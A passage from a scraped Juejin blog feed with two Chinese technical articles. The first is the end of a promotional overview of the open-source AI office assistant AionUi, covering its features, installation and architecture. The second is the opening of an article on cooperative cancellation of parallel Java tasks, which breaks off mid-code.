solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>"当AI助手从云端走向本地，从单一模型走向多模型生态，真正的生产力革命才刚刚开始。"</p>
</blockquote>
<p>这是"一天一个开源项目"系列的第7篇文章。今天带你了解的项目是 <strong>AionUi</strong>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi" target="_blank" title="https://github.com/iOfficeAI/AionUi" ref="nofollow noopener noreferrer">GitHub</a>）。</p>
<p>如果你正在寻找一个免费、开源、跨平台的AI办公助手，能够替代Claude Cowork但功能更强大，那么AionUi绝对值得你深入了解。它支持多模型、多会话、WebUI远程访问，还能进行文件管理、实时预览、AI图像生成，是一个真正的"24/7 AI办公伙伴"。</p>
<p><strong>为什么选择这个项目？</strong></p>
<ul>
<li>🆓 <strong>完全免费开源</strong>：Apache-2.0协议，无订阅费用</li>
<li>🌐 <strong>跨平台支持</strong>：macOS、Windows、Linux全平台</li>
<li>🤖 <strong>多模型生态</strong>：支持Gemini、Claude、OpenAI、Qwen、Ollama等</li>
<li>🌐 <strong>WebUI远程访问</strong>：24/7随时访问，支持移动设备</li>
<li>📁 <strong>智能文件管理</strong>：AI驱动的文件组织和处理</li>
<li>📄 <strong>实时预览</strong>：支持9+种格式的即时预览</li>
<li>🎨 <strong>AI图像生成</strong>：集成多种图像生成模型</li>
</ul>
<h3 data-id="heading-1">你将学到什么</h3>
<ul>
<li>AionUi的核心功能和架构设计</li>
<li>如何配置和使用多模型AI助手</li>
<li>WebUI远程访问的配置和使用</li>
<li>文件管理和预览功能的使用技巧</li>
<li>AI图像生成和编辑功能</li>
<li>与Claude Cowork的对比分析</li>
<li>如何快速上手使用AionUi</li>
</ul>
<h3 data-id="heading-2">前置知识</h3>
<ul>
<li>对AI助手有基本了解</li>
<li>熟悉桌面应用的使用</li>
<li>了解API Key的配置（可选）</li>
<li>对文件管理有基本概念</li>
</ul>
<hr/>
<h2 data-id="heading-3">项目背景</h2>
<h3 data-id="heading-4">项目简介</h3>
<p><strong>AionUi</strong> 是一个<strong>免费、本地、开源的24/7 AI办公助手</strong>，支持Gemini CLI、Claude Code、Codex、OpenCode、Qwen Code、Goose CLI、Auggie等多种AI代理。它提供了完整的GUI界面和WebUI远程访问，让AI助手真正成为你的"24小时办公伙伴"。</p>
<p><strong>项目解决的核心问题</strong>：</p>
<ul>
<li>Claude Cowork仅支持macOS，且锁定Claude模型</li>
<li>缺乏跨平台的AI办公助手解决方案</li>
<li>需要支持多模型的统一界面</li>
<li>需要本地部署，保护数据隐私</li>
<li>需要远程访问能力，实现24/7可用</li>
</ul>
<p><strong>面向的用户群体</strong>：</p>
<ul>
<li>需要跨平台AI助手的开发者</li>
<li>希望替代Claude Cowork的用户</li>
<li>需要多模型支持的AI用户</li>
<li>对数据隐私有要求的用户</li>
<li>需要远程访问AI工具的用户</li>
</ul>
<h3 data-id="heading-5">作者/团队介绍</h3>
<p><strong>团队：iOfficeAI</strong></p>
<ul>
<li><strong>背景</strong>：专注于AI办公自动化的开源团队</li>
<li><strong>理念</strong>：打造免费、开源、跨平台的AI办公助手</li>
<li><strong>项目定位</strong>：Claude Cowork的开源替代方案</li>
</ul>
<p><strong>项目创建时间</strong>：2024年（从GitHub活动来看是持续活跃的项目）</p>
<h3 data-id="heading-6">项目数据</h3>
<ul>
<li>⭐ <strong>GitHub Stars</strong>: 11.7k+（持续快速增长）</li>
<li>🍴 <strong>Forks</strong>: 884+</li>
<li>📦 <strong>版本</strong>: v1.7.8（最新版本，2026年1月28日发布）</li>
<li>📄 <strong>License</strong>: Apache-2.0（完全开源，自由使用）</li>
<li>🌐 <strong>官网</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aionui.com" target="_blank" title="https://www.aionui.com" ref="nofollow noopener noreferrer">www.aionui.com</a></li>
<li>📚 <strong>文档</strong>: 包含完整的使用指南和配置文档</li>
<li>💬 <strong>社区</strong>: GitHub Issues和Discussions活跃</li>
<li>👥 <strong>贡献者</strong>: 31位贡献者，活跃的社区参与</li>
</ul>
<p><strong>项目发展历程</strong>：</p>
<ul>
<li>2024年：项目创建，开始构建核心功能</li>
<li>2024年中：添加多模型支持和WebUI功能</li>
<li>2024年底：完善文件管理和预览功能</li>
<li>2025年：添加AI图像生成和编辑功能</li>
<li>2026年：持续优化，社区活跃度持续提升</li>
</ul>
<hr/>
<h2 data-id="heading-7">主要功能</h2>
<h3 data-id="heading-8">核心作用</h3>
<p>AionUi的核心作用是<strong>提供一个免费、开源、跨平台的AI办公助手</strong>，主要功能包括：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3c6bedaf8f84256893efd061ed4ff50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382563&amp;x-signature=rH6CvTezxRwIRv4MZm7qePaCGt0%3D" alt="07-01-aionui-function-banner.png" loading="lazy"/></p>
<ol>
<li><strong>多模型统一管理</strong>：支持Gemini、Claude、OpenAI、Qwen、Ollama等多种AI模型，统一管理对话历史</li>
<li><strong>跨平台使用</strong>：macOS、Windows、Linux全平台支持，支持WebUI远程访问</li>
<li><strong>文件智能管理</strong>：AI驱动的文件组织、批量处理、Excel分析等</li>
<li><strong>实时预览</strong>：支持PDF、Word、Excel、PPT、代码、Markdown等9+种格式的即时预览和编辑</li>
<li><strong>AI图像生成</strong>：集成Gemini 2.5 Flash、Nano、Banana等多种图像生成模型</li>
</ol>
<h3 data-id="heading-9">快速开始</h3>
<h4 data-id="heading-10">安装方式</h4>
<p>AionUi支持多种安装方式：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式1：从GitHub Releases下载（推荐）</span>
<span class="hljs-comment"># 访问 https://github.com/iOfficeAI/AionUi/releases</span>
<span class="hljs-comment"># 下载对应平台的安装包</span>

<span class="hljs-comment"># macOS</span>
<span class="hljs-comment"># 下载 .dmg 文件并安装</span>

<span class="hljs-comment"># Windows</span>
<span class="hljs-comment"># 下载 .exe 文件并安装</span>

<span class="hljs-comment"># Linux</span>
<span class="hljs-comment"># 下载 .AppImage 或 .deb/.rpm 文件并安装</span>

<span class="hljs-comment"># 方式2：从源码构建</span>
git <span class="hljs-built_in">clone</span> https://github.com/iOfficeAI/AionUi.git
<span class="hljs-built_in">cd</span> AionUi
npm install
npm run build
</code></pre>
<h4 data-id="heading-11">基本配置</h4>
<p><strong>1. 首次启动配置</strong></p>
<p>启动AionUi后，首次使用需要配置AI服务：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 支持Google账号登录（自动关联Gemini CLI）</span>
<span class="hljs-comment"># 或使用API Key配置</span>

<span class="hljs-comment"># Gemini配置示例</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"gemini"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_GEMINI_API_KEY"</span>

<span class="hljs-comment"># Claude配置示例</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"anthropic"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_CLAUDE_API_KEY"</span>

<span class="hljs-comment"># OpenAI配置示例</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"openai"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_OPENAI_API_KEY"</span>

<span class="hljs-comment"># 本地模型配置（Ollama）</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"custom"</span>
<span class="hljs-attr">apiUrl:</span> <span class="hljs-string">"http://localhost:11434/v1"</span>
</code></pre>
<p><strong>2. 最简单的使用示例</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 启动AionUi应用</span>
<span class="hljs-comment"># 2. 选择AI模型（如Gemini CLI）</span>
<span class="hljs-comment"># 3. 开始对话</span>

用户：<span class="hljs-string">"帮我整理一下桌面上的文件"</span>
AI：<span class="hljs-string">"我来帮你整理文件。请告诉我你的整理偏好..."</span>

用户：<span class="hljs-string">"生成一个React组件的代码"</span>
AI：<span class="hljs-string">"我来为你生成一个React组件..."</span>
</code></pre>
<h3 data-id="heading-12">核心特性</h3>
<ul>
<li><strong>多会话管理</strong>：支持多会话并发，每个会话独立上下文，本地SQLite存储</li>
<li><strong>WebUI远程访问</strong>：浏览器访问，支持移动设备，24/7可用，支持SSH隧道</li>
<li><strong>多模型生态</strong>：主流模型（Gemini、OpenAI、Claude、Qwen）+ 本地模型（Ollama、LM Studio）+ 自定义平台</li>
<li><strong>智能文件管理</strong>：文件树浏览、拖拽上传、AI智能组织、批量处理</li>
<li><strong>实时预览编辑</strong>：9+格式支持，实时跟踪文件变化，支持Markdown/代码/HTML编辑</li>
<li><strong>AI图像生成</strong>：集成多种图像生成模型，支持图像识别和编辑</li>
<li><strong>界面定制</strong>：CSS自定义界面，自由定制颜色、样式、布局</li>
<li><strong>数据安全</strong>：完全本地存储，数据不上云，用户完全控制</li>
</ul>
<h3 data-id="heading-13">项目优势</h3>

































































<table><thead><tr><th align="left">对比项</th><th align="left">AionUi</th><th align="left">Claude Cowork</th><th align="left">其他AI助手</th></tr></thead><tbody><tr><td align="left"><strong>平台支持</strong></td><td align="left">macOS / Windows / Linux</td><td align="left">macOS Only</td><td align="left">部分跨平台</td></tr><tr><td align="left"><strong>模型支持</strong></td><td align="left">多模型（Gemini、Claude、OpenAI等）</td><td align="left">Claude Only</td><td align="left">单一模型</td></tr><tr><td align="left"><strong>访问方式</strong></td><td align="left">GUI + WebUI远程访问</td><td align="left">GUI Only</td><td align="left">GUI为主</td></tr><tr><td align="left"><strong>成本</strong></td><td align="left">完全免费开源</td><td align="left">$100/月订阅</td><td align="left">部分免费</td></tr><tr><td align="left"><strong>数据隐私</strong></td><td align="left">完全本地存储</td><td align="left">云端存储</td><td align="left">混合存储</td></tr><tr><td align="left"><strong>文件管理</strong></td><td align="left">AI智能管理</td><td align="left">基础支持</td><td align="left">有限支持</td></tr><tr><td align="left"><strong>预览功能</strong></td><td align="left">9+格式实时预览</td><td align="left">有限预览</td><td align="left">基础预览</td></tr><tr><td align="left"><strong>图像生成</strong></td><td align="left">多模型支持</td><td align="left">无</td><td align="left">部分支持</td></tr><tr><td align="left"><strong>定制能力</strong></td><td align="left">CSS自定义界面</td><td align="left">有限定制</td><td align="left">有限定制</td></tr></tbody></table>
<p><strong>为什么选择AionUi？</strong></p>
<p>相比Claude Cowork，AionUi提供跨平台支持、多模型生态、WebUI远程访问、完全免费开源，是更强大的替代方案。</p>
<hr/>
<h2 data-id="heading-14">项目详细剖析</h2>
<h3 data-id="heading-15">架构设计</h3>
<p>AionUi采用<strong>Electron + React + TypeScript</strong>的现代桌面应用架构，主要包含以下几个核心模块：</p>
<h4 data-id="heading-16">核心架构</h4>
<pre><code class="hljs language-java" lang="java">AionUi Application
├── Main <span class="hljs-title function_">Process</span> <span class="hljs-params">(Electron)</span>
│   ├── 窗口管理
│   ├── 系统集成
│   ├── 文件系统访问
│   └── 本地数据库管理
├── Renderer <span class="hljs-title function_">Process</span> <span class="hljs-params">(React)</span>
│   ├── UI组件层
│   ├── 状态管理
│   ├── API调用层
│   └── 文件预览组件
├── AI服务层
│   ├── 多模型适配器
│   ├── API调用封装
│   ├── 流式响应处理
│   └── 上下文管理
└── 数据层
    ├── SQLite数据库（对话历史）
    ├── 本地文件存储
    └── 配置管理
</code></pre>
<h4 data-id="heading-17">多模型适配架构</h4>
<p>AionUi通过统一的适配器模式支持多种AI模型，每个模型（Gemini、Claude、OpenAI等）都有独立的适配器实现，通过统一的<code>AIModelAdapter</code>接口管理。这种设计使得添加新模型变得简单，各模型实现独立，支持动态加载和配置。</p>
<h4 data-id="heading-18">WebUI远程访问架构</h4>
<p>AionUi的WebUI通过内置Express服务器和WebSocket实现，提供静态文件服务、API路由（聊天、会话、模型管理）和实时通信。支持Token认证、HTTPS、IP白名单和SSH隧道等安全机制。</p>
<h3 data-id="heading-19">文件管理系统</h3>
<p>AionUi的文件管理系统支持文件树浏览、拖拽上传和AI驱动的智能组织。通过<code>FileTreeManager</code>扫描文件系统，使用AI分析文件并执行组织操作。支持文件和文件夹的递归处理。</p>
<h3 data-id="heading-20">预览面板系统</h3>
<p>AionUi的预览面板通过<code>PreviewComponent</code>接口实现插件化架构，支持PDF、Word、Excel、PPT、代码、Markdown、HTML、图像、JSON/YAML/CSV等9+种格式。每个预览组件实现<code>canPreview</code>、<code>render</code>、<code>update</code>方法，<code>PreviewManager</code>负责管理和路由。支持实时文件监听和编辑。</p>
<h3 data-id="heading-21">多会话管理系统</h3>
<p>AionUi的<code>ConversationManager</code>管理多个并发会话，每个会话包含独立的对话历史、模型配置和元数据。支持自动标题生成、智能上下文截取（基于Token限制）、SQLite本地持久化和快速切换。</p>
<h3 data-id="heading-22">AI图像生成系统</h3>
<p>AionUi通过<code>ImageGenerator</code>接口实现插件化的图像生成架构，支持Gemini 2.5 Flash Image Preview、Nano、Banana等多种模型。<code>ImageGenerationManager</code>统一管理所有生成器，支持单个和批量生成。</p>
<h3 data-id="heading-23">本地数据安全</h3>
<p>AionUi使用SQLite数据库存储所有数据（对话历史、文件元数据、设置），数据完全存储在用户数据目录，不会上传到任何服务器。支持可选的数据加密和数据导出功能，用户完全控制自己的数据。</p>
<hr/>
<h2 data-id="heading-24">项目地址与资源</h2>
<h3 data-id="heading-25">官方资源</h3>
<ul>
<li>🌟 <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi" target="_blank" title="https://github.com/iOfficeAI/AionUi" ref="nofollow noopener noreferrer">github.com/iOfficeAI/A…</a></li>
<li>📚 <strong>文档</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi%2Fwiki" target="_blank" title="https://github.com/iOfficeAI/AionUi/wiki" ref="nofollow noopener noreferrer">GitHub Wiki</a></li>
<li>💬 <strong>社区</strong>: GitHub Discussions</li>
<li>🐛 <strong>Issue Tracker</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi%2Fissues" target="_blank" title="https://github.com/iOfficeAI/AionUi/issues" ref="nofollow noopener noreferrer">GitHub Issues</a></li>
<li>📦 <strong>最新版本</strong>: v1.7.8（2026年1月28日发布）</li>
</ul>
<h3 data-id="heading-26">适用人群</h3>
<p><strong>AionUi特别适合</strong>：需要跨平台AI助手的开发者、多模型用户、对数据隐私有要求的用户、需要办公自动化功能的用户，以及希望替代Claude Cowork的免费开源方案的用户。</p>
<p><strong>不适合</strong>：只需要简单聊天的用户、不需要跨平台的macOS用户、不需要多模型支持的用户。</p>
<hr/>
<p><em>欢迎来我中的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>找到更多有用的知识和有趣的产品</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 并行任务协作式取消机制设计与实现]]></title>    <link>https://juejin.cn/post/7600955777315848230</link>    <guid>https://juejin.cn/post/7600955777315848230</guid>    <pubDate>2026-01-30T13:01:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315848230" data-draft-id="7600953879500931123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 并行任务协作式取消机制设计与实现"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-30T13:01:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="桦说编程"/> <meta itemprop="url" content="https://juejin.cn/user/2212689394274136"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 并行任务协作式取消机制设计与实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2212689394274136/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    桦说编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:01:02.000Z" title="Fri Jan 30 2026 13:01:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>这篇文章主要根据我最近做的线程池任务支持协作式取消功能写的，代码中可能涉及一些无关内容，请酌情忽略。内容涉及：</p>
<ol>
<li>重度依赖 <code>ListenableFuture</code> 实现取消机制</li>
<li>使用 <code>TTL/ThreadLocal</code> 实现上下文传播(实际上，如果能手动显式传递上下文最好）</li>
<li>之前文章提到的并发度控制也支持了取消机制</li>
<li>资源清理</li>
</ol>
<p>为了使问题不过于复杂，删除了关于嵌套取消传播的内容，下篇文章会谈到，敬请期待。</p>
</blockquote>
<h2 data-id="heading-0">背景</h2>
<p>在高并发系统中，我们经常需要并行执行大量子任务。然而，当出现以下情况时，继续执行剩余任务往往是资源浪费：</p>
<ol>
<li><strong>超时</strong>：总体任务已超时，继续执行无意义</li>
<li><strong>快速失败（Fail-Fast）</strong>：某个子任务异常，整批任务结果已不可用</li>
<li><strong>主动取消</strong>：业务逻辑判断不再需要结果</li>
</ol>
<p>Java 原生的 <code>Thread.interrupt()</code> 只能中断阻塞操作（如 <code>sleep</code>、<code>wait</code>、<code>BlockingQueue.take</code>），无法中断正在执行 CPU 密集型代码的线程。因此，我们需要设计一套<strong>协作式取消机制（Cooperative Cancellation）</strong>。</p>
<h2 data-id="heading-1">设计目标</h2>
<ol>
<li><strong>统一的取消信号传递</strong>：所有并行子任务共享同一个取消令牌</li>
<li><strong>支持多种取消原因</strong>：超时、异常、主动取消</li>
<li><strong>轻量级检查点</strong>：任务可以在关键节点主动检查取消状态</li>
<li><strong>延迟绑定</strong>：取消令牌在任务提交后才绑定实际的 Future</li>
<li><strong>资源自动释放</strong>：取消后自动清理未完成任务</li>
</ol>
<h2 data-id="heading-2">核心组件设计</h2>
<h3 data-id="heading-3">1. CancellationTokenState - 取消状态枚举</h3>
<p>首先定义清晰的状态枚举，避免魔法数字：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CancellationTokenState</span> {
    <span class="hljs-comment">/** 任务正在运行 */</span>
    RUNNING(<span class="hljs-number">0</span>),
    <span class="hljs-comment">/** 任务成功完成 */</span>
    SUCCESS(<span class="hljs-number">1</span>),
    <span class="hljs-comment">/** 空操作 */</span>
    NO_OP(<span class="hljs-number">2</span>),
    <span class="hljs-comment">/** 因其他任务异常而取消（快速失败） */</span>
    FAIL_FAST_CANCELLED(-<span class="hljs-number">1</span>),
    <span class="hljs-comment">/** 因超时而取消 */</span>
    TIMEOUT_CANCELLED(-<span class="hljs-number">2</span>),
    <span class="hljs-comment">/** 因主动调用 cancel() 而取消 */</span>
    MUTUAL_CANCELLED(-<span class="hljs-number">3</span>);

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> value;

    <span class="hljs-comment">/**
     * 判断是否需要取消子任务
     * 负值状态表示需要取消
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldCancelSubtasks</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.value &lt; <span class="hljs-number">0</span>;
    }
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ul>
<li>使用正值表示正常状态，负值表示取消状态</li>
<li><code>shouldCancelSubtasks()</code> 方法提供语义化的判断接口</li>
</ul>
<h3 data-id="heading-4">2. CancellationToken - 取消令牌</h3>
<p>取消令牌是整个机制的核心，负责：</p>
<ul>
<li>跟踪任务批次的整体状态</li>
<li>传递取消信号</li>
<li>支持延迟绑定</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CancellationToken</span> {
    <span class="hljs-comment">// 使用 SettableFuture 支持延迟绑定</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SettableFuture&lt;Object&gt; futureToken = SettableFuture.create();
    <span class="hljs-comment">// 原子状态，保证线程安全</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AtomicReference&lt;CancellationTokenState&gt; state =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(RUNNING);

    <span class="hljs-comment">/**
     * 延迟绑定：在任务提交后绑定实际的 Future
     *
     * <span class="hljs-doctag">@param</span> futures 所有子任务的 Future 列表
     * <span class="hljs-doctag">@param</span> timeout 超时时间
     * <span class="hljs-doctag">@param</span> submitCanceller 提交器的取消 Future
     */</span>
